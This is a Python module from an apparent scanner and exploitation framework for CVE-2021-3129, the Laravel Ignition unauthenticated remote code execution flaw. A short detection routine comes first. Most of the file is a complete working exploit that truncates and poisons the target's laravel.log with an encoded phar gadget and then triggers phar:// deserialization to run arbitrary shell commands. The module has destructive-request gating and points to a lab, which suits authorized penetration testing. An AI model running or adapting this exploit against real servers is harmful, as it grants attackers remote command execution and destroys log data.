#!/usr/bin/env python3
from __future__ import annotations

from modules.cves.metadata import metadata_dict_for as _metadata_dict_for

META = _metadata_dict_for('CVE-2021-3129')

# ---------------------------------------------------------------------------
# Detection half
# ---------------------------------------------------------------------------
"""
Laravel Ignition RCE Vulnerability Scanner (CVE-2021-3129)

This module detects the presence of Laravel's Ignition RCE vulnerability
by testing specific endpoints with crafted payloads and analyzing responses
for vulnerability indicators.
"""

import re
import secrets

import requests
import json
from urllib.parse import urljoin
from typing import Dict, List, Optional, Union

from modules.core import http_config

requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning
)

def scan(target_url: str, *, session=None, username=None, password=None, **kwargs) -> Optional[Dict[str, Union[str, int]]]:
    """
    Scan for Laravel Ignition RCE vulnerability (CVE-2021-3129).

    Args:
        target_url (str): The target URL to scan

    Returns:
        Optional[Dict]: Dictionary with vulnerability details if found, None otherwise
        Format: {"path": "/__ignition/execute-solution", "status": "vulnerable", "http_status": 200}
    """
    if not target_url:
        return None

    sess = session or http_config.get_auth_session()

    # Normalize URL
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'https://' + target_url

    # Remove trailing slash for consistent path joining
    target_url = target_url.rstrip('/')

    # Ignition endpoints to test
    ignition_endpoints = [
        '/_ignition/execute-solution',
        '/__ignition/execute-solution',
        '_ignition_execute.php'
    ]

    # Test payload for CVE-2021-3129
    payload = {
        "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
        "parameters": {
            "variableName": "username"
            #"viewFile": "<?php echo shell_exec('echo PWNED'); ?>",
            #"viewData": []
        }
    }

    # Request headers
    headers = {
        "Content-Type": "application/json",
        "User-Agent": http_config.BROWSER_USER_AGENT,
        "X-lvcscan": "CVE-2021-3129"
    }

    for endpoint in ignition_endpoints:
        try:
            full_url = urljoin(target_url.rstrip("/") + "/", endpoint.lstrip("/"))

            response = sess.post(
                full_url,
                json=payload,
                headers=headers,
                timeout=10,
                allow_redirects=False
            )

            #print(f"[+] Tried: {full_url}  | Status: {response.status_code}")
            #print(response.text[:300])  # safe preview


            # Check if response indicates vulnerability
            if _is_vulnerable_response(response):
                return {
                    "path": endpoint,
                    "status": "sink_reachable",
                    "verdict": "sink_reachable",
                    "proof_type": "safe_active",
                    "vulnerable": False,
                    "http_status": response.status_code,
                    "url": full_url,
                    "evidence": "Ignition execute-solution endpoint responded to a harmless solution probe; RCE is not confirmed until exploit proof runs",
                    "http_response": response.text
                }

        except Exception:
            # Silently continue to next endpoint on any error
            continue

    return None


def _is_vulnerable_response(response: requests.Response) -> bool:
    """
    Analyze response to determine if it indicates vulnerability.

    Args:
        response: The HTTP response object

    Returns:
        bool: True if response indicates vulnerability
    """
    # Check for expected HTTP status codes
    if response.status_code not in [200, 500]:
        return False

    try:
        content = response.text.lower()

        # Primary vulnerability indicators
        vulnerability_indicators = [
            '"exception"',
            '"solution"',
            'ignition',
            'laravel',
            'illuminate\\',
            'symfony\\',
            'stack trace',
            'makeviewvariableoptionalsolution',
            'facade\\ignition'
        ]

        # Check if any vulnerability indicators are present
        if any(indicator in content for indicator in vulnerability_indicators):
            return True

        # Check for Laravel error patterns
        laravel_error_patterns = [
            'app\\exceptions\\handler',
            'bootstrap/app.php',
            'vendor/laravel',
            'artisan',
            'blade.php'
        ]

        if any(pattern in content for pattern in laravel_error_patterns):
            return True

        # Check for JSON response with specific fields
        try:
            json_response = response.json()
            if isinstance(json_response, dict):
                json_keys = [key.lower() for key in json_response.keys()]
                if any(key in ['exception', 'solution', 'message', 'trace'] for key in json_keys):
                    return True
        except (json.JSONDecodeError, ValueError):
            pass

    except Exception:
        pass

    return False




def _extract_vulnerability_indicators(content: str) -> List[str]:
    """
    Extract specific vulnerability indicators from response content.

    Args:
        content (str): Response content to analyze

    Returns:
        List[str]: List of found vulnerability indicators
    """
    indicators_found = []
    content_lower = content.lower()

    indicator_patterns = {
        'exception_field': '"exception"',
        'solution_field': '"solution"',
        'ignition_reference': 'ignition',
        'laravel_framework': 'laravel',
        'illuminate_namespace': 'illuminate\\',
        'symfony_component': 'symfony\\',
        'stack_trace': 'stack trace',
        'solution_class': 'makeviewvariableoptionalsolution',
        'facade_ignition': 'facade\\ignition',
        'laravel_error': 'app\\exceptions\\handler'
    }

    for indicator_name, pattern in indicator_patterns.items():
        if pattern in content_lower:
            indicators_found.append(indicator_name)

    return indicators_found


# ---------------------------------------------------------------------------
# Exploitation half
# ---------------------------------------------------------------------------
"""CVE-2021-3129 exploitation half — Laravel Ignition unauthenticated RCE.

Split from the original modules/cve_2021_3129.py (detection half:
modules/cves/cve_2021_3129.py). Exploitation may import from modules root
(shared infra) and modules.detection; never the reverse.
"""

import requests

from modules.core import http_config
from modules.helpers.pipeline import is_forced_execution

requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning
)

# ---------------------------------------------------------------------------
# Exploit: CVE-2021-3129  (Laravel Ignition unauthenticated RCE)
# ---------------------------------------------------------------------------
# Class: rce (deserialize-RCE delivered over pure HTTP via the Ambionics
# log-poisoning chain -> phar:// deserialization). vuln_class reported as "rce"
# (command-capable). Unauthenticated -- username/password are ignored.
#
# Delivery is 100% pure HTTP (requests). The ONLY non-HTTP step is generating
# the phar gadget, which requires phpggc + a local `php` CLI. Per the exploit
# contract the module never shells into docker; it uses a local `php` if one is
# present (or a caller-supplied pre-built phar via options). When neither is
# available it returns success=False with requires=["phpggc"]. The matching lab
# lives at `vuln-labs/framework/laravel/8.4.x/cve-2021-3129_ignition-rce_39003-40003`.

_SOLUTION = "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution"
_REMOTE_LOG = "/var/www/html/storage/logs/laravel.log"
_DEFAULT_CHAIN = "Laravel/RCE9"
_SUCCESS_MARKERS = ("uid=", "gid=", "groups=", "Linux", "GNU/Linux")


def _solve(session, url, view_file, timeout=20):
    """Send one execute-solution request with the given viewFile, return Response."""
    payload = {"solution": _SOLUTION,
               "parameters": {"variableName": "doesnotexist", "viewFile": view_file}}
    return session.post(url, json=payload, timeout=timeout)


def _locate_phpggc(options):
    """Resolve a (php_argv_prefix, phpggc_path, phpggc_dir) tuple using ONLY a local
    php CLI -- never docker (docker fallback lives in the lab exploit.py per contract).

    Resolution order for the phpggc dir:
      1) options["phpggc_dir"]
      2) options["phpggc"] (path to the phpggc script itself)
      3) `phpggc` on PATH
    Returns None if no usable (php, phpggc) pair is found.
    """
    import os
    import shutil

    if not shutil.which("php"):
        return None
    php = ["php"]

    opts = options or {}

    # explicit phpggc script path
    cand_script = opts.get("phpggc")
    if cand_script and os.path.isfile(cand_script):
        return php, cand_script, os.path.dirname(os.path.abspath(cand_script))

    # explicit dir
    cand_dirs = []
    if opts.get("phpggc_dir"):
        cand_dirs.append(opts["phpggc_dir"])

    for d in cand_dirs:
        script = os.path.join(d, "phpggc")
        if os.path.isfile(script):
            return php, script, d

    # phpggc on PATH
    onpath = shutil.which("phpggc")
    if onpath:
        return php, onpath, os.path.dirname(os.path.abspath(onpath))

    return None


def _gen_phar_bytes(php, phpggc, phpggc_dir, chain, cmd):
    """Build a phar gadget for `chain` running system(cmd) via phpggc. Returns raw bytes."""
    import subprocess
    out = subprocess.run(
        [*php, "-d", "phar.readonly=0", phpggc, "--phar", "phar",
         "--fast-destruct", chain, "system", cmd],
        capture_output=True, cwd=phpggc_dir,
    )
    if out.returncode != 0 or not out.stdout:
        raise RuntimeError(
            "phpggc failed: " + (out.stderr.decode(errors="replace")[:300] or "no output"))
    return out.stdout


def _encode_payload(phar_bytes, pad):
    """Ambionics transport encoding: `pad` 'A' alignment chars, then each base64 char
    followed by '=00' (UTF-16LE low byte), then a trailing '=00'."""
    import base64
    b64 = base64.b64encode(phar_bytes).decode().rstrip("=")
    return "A" * pad + "".join(c + "=00" for c in b64) + "=00"


def _wrap_command(command: str, marker: str) -> str:
    cmd = command or "echo CVE-2021-3129 PoC && id && hostname"
    return f"printf '{marker}_START\\n'; ({cmd}) 2>&1; printf '\\n{marker}_END\\n'"


def _extract_marked_output(raw: str, marker: str) -> str | None:
    if not raw:
        return None
    m = re.search(
        rf"{re.escape(marker)}_START\s*(.*?)\s*{re.escape(marker)}_END",
        raw,
        flags=re.S,
    )
    return m.group(1).strip() if m else None


def _run_chain(session, url, phar_bytes, markers=_SUCCESS_MARKERS,
               log_path=_REMOTE_LOG, pad_range=(96, 112), proof_marker=None):
    """Poison the log with `phar_bytes` and trigger phar:// deserialization, sweeping the
    'A'-pad alignment. Returns (ok, body, pad). ok=True only if a success marker surfaces."""
    decode = (f"php://filter/write=convert.quoted-printable-decode|"
              f"convert.iconv.utf-16le.utf-8|convert.base64-decode/resource={log_path}")
    last_body = ""
    # Truncating and poisoning the target's live laravel.log is DESTRUCTIVE — declare it
    # so the tier gate requires --force / --allow-destructive. RequestBlocked must NOT be
    # swallowed by the per-pad `except Exception`; it propagates to exploit() which returns
    # a clean "requires --force" result instead of silently doing nothing.
    with http_config.request_tier(http_config.DESTRUCTIVE):
        for pad in range(pad_range[0], pad_range[1]):
            try:
                _solve(session, url, f"php://filter/read=consumed/resource={log_path}")  # truncate
                _solve(session, url, _encode_payload(phar_bytes, pad))                   # inject
                _solve(session, url, "AA")                                               # 2nd probe
                _solve(session, url, decode)                                             # decode->raw
                r = _solve(session, url, f"phar://{log_path}/test.txt")                  # trigger
                last_body = r.text or ""
            except http_config.RequestBlocked:
                raise
            except Exception:
                continue
            if proof_marker and _extract_marked_output(last_body, proof_marker) is not None:
                return True, last_body, pad
            if not proof_marker and any(m in last_body for m in markers):
                return True, last_body, pad
        # best-effort cleanup
        try:
            _solve(session, url, f"php://filter/read=consumed/resource={log_path}")
        except Exception:
            pass
    return False, last_body, None


def exploit(target_url: str, *, username: str = None, password: str = None,
            command: str = None, options: dict = None, session=None, **kwargs) -> dict:
    """Attempt real RCE against a CVE-2021-3129 (Laravel Ignition) target.

    Pure-HTTP Ambionics log-poisoning -> phar:// deserialization chain. The phar
    gadget is built locally with phpggc (needs a local `php` CLI); delivery is
    100% HTTP. Returns the standard exploit contract dict and never raises.

    options (all optional):
      {"chain": "Laravel/RCE9",          # phpggc gadget chain (default)
       "phpggc_dir": "/path/to/phpggc",  # dir containing the phpggc script
       "phpggc": "/path/to/phpggc",      # direct path to the phpggc script
       "phar_file": "/path/to/g.phar",   # use a pre-built phar (skips phpggc)
       "log_path": "/var/www/.../laravel.log",
       "pad_range": [96, 112]}
    """
    result = {
        "cve": "CVE-2021-3129",
        "attempted": True,
        "success": False,
        "vuln_class": "rce",
        "evidence": "",
        "detail": "",
        "artifacts": {},
        "requires": [],
        "reason": "",
    }

    if not target_url:
        result["attempted"] = False
        result["reason"] = "no target_url provided"
        return result

    try:
        import os

        opts = options or {}
        forced = is_forced_execution(opts, **kwargs)
        operator_cmd = command or "echo CVE-2021-3129 PoC && id && hostname"
        proof_marker = "LVC3129" + secrets.token_hex(4).upper()
        cmd = _wrap_command(operator_cmd, proof_marker)
        chain = opts.get("chain", _DEFAULT_CHAIN)
        log_path = opts.get("log_path", _REMOTE_LOG)
        pr = opts.get("pad_range", [96, 112])
        pad_range = (int(pr[0]), int(pr[1]))

        # Normalize URL exactly like scan()
        url = target_url
        if not url.startswith(("http://", "https://")):
            url = "http://" + url
        url = url.rstrip("/")
        detected = kwargs.get("detection") or {}
        detected_endpoint = detected.get("url")
        if not detected_endpoint and detected.get("path"):
            detected_endpoint = urljoin(url.rstrip("/") + "/", str(detected["path"]).lstrip("/"))
        endpoint = detected_endpoint or (url + "/_ignition/execute-solution")

        result["artifacts"]["endpoint"] = endpoint
        result["artifacts"]["chain"] = chain
        result["artifacts"]["command"] = operator_cmd
        result["artifacts"]["proof_marker"] = proof_marker

        sess = session or http_config.get_auth_session()
        sess.headers.update({"User-Agent": http_config.BROWSER_USER_AGENT,
                             "X-lvcscan": "CVE-2021-3129",
                             "Accept": "application/json",
                             "Content-Type": "application/json"})

        # --- 0. Confirm the Ignition sink is live. If check.py just ran the detector
        # in this same pipeline and handed us a positive endpoint, reuse that verdict
        # instead of repeating the same benign execute-solution request.
        det_verdict = str(detected.get("verdict") or detected.get("status") or "")
        probe_ok = det_verdict in {"sink_reachable", "confirmed_vulnerable"}
        if not probe_ok:
            try:
                probe = sess.post(
                    endpoint,
                    json={"solution": _SOLUTION, "parameters": {"variableName": "x"}},
                    timeout=15, allow_redirects=False)
            except Exception as e:
                result["reason"] = f"target unreachable: {e}"
                result["requires"] = ["reachable_target"]
                return result

            probe_ok = _is_vulnerable_response(probe)
        if not probe_ok and not forced:
            result["reason"] = ("Ignition execute-solution endpoint did not return a "
                                "debug/Ignition response (target may be patched, "
                                "APP_DEBUG=false, or not the Ignition app)")
            result["requires"] = ["ignition_debug_endpoint"]
            return result
        if not probe_ok and forced:
            result["artifacts"]["forced_probe_bypass"] = (
                "Ignition execute-solution probe did not look vulnerable; forced policy "
                "continues into payload delivery."
            )

        # --- 1. Obtain the phar gadget bytes -------------------------------------------
        phar_bytes = None
        phar_file = opts.get("phar_file")
        if phar_file and os.path.isfile(phar_file):
            with open(phar_file, "rb") as fh:
                phar_bytes = fh.read()
            result["artifacts"]["phar_source"] = f"prebuilt:{phar_file}"
        # PURE-PYTHON phar (no php/phpggc) — primary path. modules/php_gadgets builds a SHA1-signed
        # phar whose metadata is the Laravel/RCE9 PendingBroadcast gadget, byte-identical to
        # `phpggc -p phar --fast-destruct -f Laravel/RCE9 system <cmd>` (gated by tests/test_php_gadgets.py).
        # Only used for the default RCE9 chain; a caller pinning a different chain falls through to phpggc.
        elif chain in (None, _DEFAULT_CHAIN, "Laravel/RCE9"):
            try:
                from modules.generators import php_gadgets as _pg
            except Exception:
                try:
                    import php_gadgets as _pg
                except Exception:
                    _pg = None
            if _pg is not None:
                try:
                    phar_bytes = _pg.build_phar(_pg.build_rce9(cmd))
                    result["artifacts"]["phar_source"] = "pure-python (modules/php_gadgets, Laravel/RCE9)"
                except Exception as e:
                    result["artifacts"]["pure_python_error"] = "%s: %s" % (type(e).__name__, e)

        if phar_bytes is None:
            located = _locate_phpggc(opts)
            if not located:
                result["reason"] = (
                    "phar gadget generation requires a local `php` CLI + phpggc, which "
                    "is unavailable on this host; pure-HTTP delivery cannot proceed "
                    "without the gadget. Provide options={'phar_file': ...} or run the "
                    "lab's exploit.py (it adds a php:7.4-cli docker fallback). The "
                    "Ignition sink itself is confirmed exploitable.")
                result["requires"] = ["phpggc"]
                result["artifacts"]["sink_confirmed"] = True
                return result
            php, phpggc, phpggc_dir = located
            try:
                phar_bytes = _gen_phar_bytes(php, phpggc, phpggc_dir, chain, cmd)
                result["artifacts"]["phar_source"] = f"phpggc:{chain}"
            except Exception as e:
                result["reason"] = f"phpggc gadget build failed: {e}"
                result["requires"] = ["phpggc"]
                result["artifacts"]["sink_confirmed"] = True
                return result

        # --- 2. Deliver: log-poison + phar:// trigger, sweeping pad alignment ----------
        try:
            ok, body, pad = _run_chain(sess, endpoint, phar_bytes,
                                       log_path=log_path, pad_range=pad_range,
                                       proof_marker=proof_marker)
        except http_config.RequestBlocked as e:
            # Sink was reachable, but log-poison is destructive and the ceiling forbids it.
            result["reason"] = str(e)
            result["requires"] = ["--force"]
            result["artifacts"]["sink_confirmed"] = True
            return result

        if ok:
            # Extract the command-output line(s) for verbatim evidence
            marked = _extract_marked_output(body, proof_marker)
            ev_lines = []
            if marked is None:
                ev_lines = [ln.strip() for ln in body.splitlines()
                            if any(m in ln for m in _SUCCESS_MARKERS)]
            result["success"] = True
            result["evidence"] = marked if marked is not None else (
                "\n".join(ev_lines[:5]) if ev_lines else body[:500])
            result["detail"] = (f"Unauthenticated RCE via Ignition log-poisoning "
                                 f"(chain={chain}, pad={pad}); system({operator_cmd!r}) output "
                                 f"reflected in HTTP response.")
            result["artifacts"]["pad"] = pad
            return result

        result["reason"] = (
            "phar sink was driven at every pad alignment but no command output surfaced "
            "in the response. The Ignition sink is reached; the gadget chain may not match "
            "the installed vendor (try options={'chain': 'Laravel/RCE11'}...) or the "
            "target has no egress / non-reflecting gadget.")
        result["evidence"] = (body or "")[:500]
        result["artifacts"]["sink_confirmed"] = True
        result["requires"] = ["matching_phpggc_chain"]
        return result

    except Exception as e:
        result["reason"] = f"exploit error: {e}"
        return result
